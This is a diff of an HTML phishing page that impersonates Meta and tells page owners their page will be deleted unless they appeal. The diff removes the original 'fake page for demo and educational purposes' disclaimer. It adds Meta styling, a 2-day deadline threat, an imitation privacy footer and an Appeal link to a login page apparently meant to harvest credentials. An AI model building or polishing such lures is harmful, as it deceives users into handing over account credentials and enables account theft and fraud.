@@ -2,62 +2,120 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Meta Page Warning</title>
+  <title>Meta – Page Violation Notice</title>
   <style>
     body {
-      font-family: sans-serif;
-      background: #f3f6fb;
-      padding: 30px;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      color: #1c1e21;
+    }
+    .header-bar {
+      background-color: white;
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+    .header-bar span {
+      margin-right: 5px;
+      font-weight: bold;
     }
     .container {
-      max-width: 480px;
-      margin: auto;
-      background: white;
+      max-width: 600px;
+      margin: 30px auto;
+      background-color: white;
       padding: 25px;
-      border-radius: 10px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+      border-radius: 8px;
+      box-shadow: 0 0 5px rgba(0,0,0,0.1);
     }
-    .logo {
+    .meta-logo {
       font-size: 24px;
-      font-weight: bold;
       color: #1877f2;
-    }
-    .header {
-      color: red;
       font-weight: bold;
+      margin-bottom: 20px;
+    }
+    h2 {
+      color: #d32f2f;
       font-size: 18px;
-      margin: 15px 0;
+    }
+    p {
+      line-height: 1.6;
+      font-size: 15px;
     }
     .button {
+      display: block;
       background: #1877f2;
       color: white;
       border: none;
       padding: 12px;
+      border-radius: 5px;
       width: 100%;
       font-size: 16px;
-      border-radius: 5px;
       cursor: pointer;
       margin-top: 20px;
+      text-align: center;
+    }
+    .section-title {
+      font-weight: bold;
+      margin-top: 30px;
+      font-size: 16px;
     }
     .footer {
-      margin-top: 30px;
-      font-size: 12px;
-      color: gray;
-      text-align: center;
+      margin-top: 40px;
+      font-size: 13px;
+      color: #555;
+    }
+    .footer a {
+      color: #1877f2;
+      text-decoration: none;
     }
   </style>
 </head>
 <body>
+  <div class="header-bar">
+    <span>6:33</span> •ll <span>27</span> 00 <strong style="margin-left: auto;">Meta</strong>
+  </div>
+  
   <div class="container">
-    <div class="logo">Meta</div>
-    <div class="header">🚫 We have scheduled your page to be deleted</div>
-    <p>We have detected violation on your recent page post that violates our community standards. If you believe this to be a mistake, you can submit an appeal.</p>
-
-    <!-- ✅ Appeal button that goes to login.html -->
-    <button class="button" onclick="window.location.href='login.html'">Appeal</button>
-
+    <div class="meta-logo">Meta</div>
+    
+    <h2>We have scheduled your page to be deleted</h2>
+    
+    <p>We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification.</p>
+    
+    <p>If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.</p>
+    
+    <div class="section-title">Appeal Request</div>
+    <p>Fixing problems with your page.<br>Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.</p>
+    
+    <a href="login.html" class="button">Appeal</a>
+    
+    <div class="section-title">Appeal Guide</div>
+    <p>In your appeal, please ensure that all necessary information is included in your request so that it can be processed promptly. If you provide incorrect information or fail to respond to requests for additional information within 2 days, your appeal may be closed without further review, and your page will be deleted permanently.</p>
+    
+    <p>After your submission, we will review your appeal and cancel the page deletion if the information you provide is correct. The review process typically takes 24 hours, though in some cases it may take longer.</p>
+    
     <div class="footer">
-      ⚠️ This is a fake page created for demo and educational purposes only. No data is collected.
+      <p><strong>Privacy Center</strong></p>
+      <p>٠١١. (27)</p>
+      <p><strong>What is the Privacy Policy and what does it say?</strong><br><a href="#">Privacy Policy</a></p>
+      
+      <p><strong>How you can manage or delete your information</strong><br><a href="#">Privacy Policy ></a></p>
+      
+      <p>For more details, see the <a href="#">User Agreement</a></p>
+      
+      <p><strong>Meta AI</strong></p>
+      <ul>
+        <li><a href="#">How Meta uses information for generative AI models</a></li>
+        <li><a href="#">Cards with information about the operation of AI systems</a></li>
+        <li><a href="#">Meta AI website</a></li>
+        <li><a href="#">Introduction to Generative AI</a></li>
+        <li><a href="#">For teenagers</a></li>
+      </ul>
+      
+      <p>We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. <a href="#">Read more about Privacy Policy</a>.</p>
     </div>
   </div>
 </body>
